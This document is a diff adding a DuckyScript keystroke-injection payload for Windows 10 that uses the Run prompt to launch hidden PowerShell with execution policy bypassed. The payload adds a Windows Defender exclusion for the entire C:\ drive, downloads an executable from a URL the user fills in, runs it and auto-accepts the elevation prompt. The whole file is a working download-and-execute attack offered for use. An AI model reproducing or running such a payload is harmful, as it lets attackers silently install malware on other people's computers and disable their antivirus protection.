@@ -1,0 +1,23 @@
+REM Title: Download-Execute from Run Prompt
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Uses the Run Prompt to download a file and run it.
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace FILE_URL_HERE with the url of your file to run.
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:Temp;Add-MpPreference -ExclusionPath C:\;Start-Sleep 1;
+
+REM replace FILE_URL_HERE below.
+STRING iwr -Uri FILE_URL_HERE -O upl.exe;Start-Sleep 1;Start upl.exe;exit
+
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
